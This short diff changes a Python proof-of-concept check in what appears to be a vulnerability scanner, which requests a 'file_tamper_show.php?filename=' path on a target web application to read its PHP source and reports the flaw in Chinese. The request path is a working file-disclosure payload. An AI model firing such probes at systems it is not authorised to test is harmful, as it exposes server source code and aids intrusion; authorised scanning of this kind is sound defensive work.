@@ -50,7 +50,7 @@ class Poc(ABPoc):
             payload = '/function/content/tamper/file_tamper_show.php?filename=file_tamper_show.php'
             verify_url = self.target + payload
             req = requests.get(verify_url)
-            content = req.content
+            content = req.text
 
             if req.status_code == 200 and ('?php' in content) and ('file_get_contents' in content):
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
